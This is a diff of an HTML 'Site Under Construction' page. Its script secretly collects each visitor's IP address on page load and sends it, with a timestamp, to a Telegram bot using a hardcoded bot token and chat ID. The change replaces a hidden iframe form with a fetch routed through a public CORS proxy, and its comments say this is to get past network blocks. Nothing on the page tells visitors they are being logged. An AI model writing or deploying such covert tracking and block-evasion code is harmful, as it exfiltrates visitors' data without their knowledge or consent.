@@ -6,35 +6,44 @@
     <title>Welcome</title>
     <script>
         window.onload = function() {
-            // 1. Get the visitor's IP address
+            // 1. Fetch the user's IP address
             fetch('https://ipify.org')
                 .then(response => response.json())
                 .then(data => {
+                    const botToken = '8679091860:AAHJU3E_vBVt_k70KANc9lThQxXY5QYjHRE';
+                    const chatId = '8714686528';
+                    const messageText = `📌 Visitor Logged\n🌐 IP Address: ${data.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
                     
-                    // 2. Format the log text message
-                    const textMessage = `📌 Visitor Logged\n🌐 IP Address: ${data.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
+                    // 2. Base Telegram target URL
+                    const rawTelegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                     
-                    // 3. Insert the message into our hidden form inputs
-                    document.getElementById('telegram_text').value = textMessage;
-                    
-                    // 4. Natively submit the form using an invisible frame to prevent page redirection
-                    document.getElementById('telegram_form').submit();
+                    // 3. Wrap inside a public proxy to bypass your network's 302 blocks
+                    const proxiedUrl = `https://corsproxy.io{encodeURIComponent(rawTelegramUrl)}`;
+
+                    // 4. Send the payload safely
+                    fetch(proxiedUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: messageText
+                        })
+                    })
+                    .then(res => {
+                        if (res.ok) {
+                            console.log("Success! Message bypassed network restrictions.");
+                        } else {
+                            console.error("The network proxy connected, but Telegram rejected the inputs.");
+                        }
+                    });
                 })
-                .catch(err => console.error("IP provider blocked by extensions:", err));
+                .catch(err => console.error("IP source blocked by adblock extension:", err));
         };
     </script>
 </head>
 <body>
-    <!-- Hidden frame to absorb the Telegram response so the page doesn't reload -->
-    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
-
-    <!-- Standard HTML Form configured with your exact Bot Token and Chat ID -->
-    <form id="telegram_form" action="https://telegram.org" method="POST" target="hidden_iframe" style="display:none;">
-        <input type="hidden" name="chat_id" value="8714686528">
-        <input type="hidden" name="text" id="telegram_text" value="">
-    </form>
-
-    <!-- Content visible to your site visitors -->
     <h1>Site Under Construction</h1>
     <p>Please check back later.</p>
 </body>
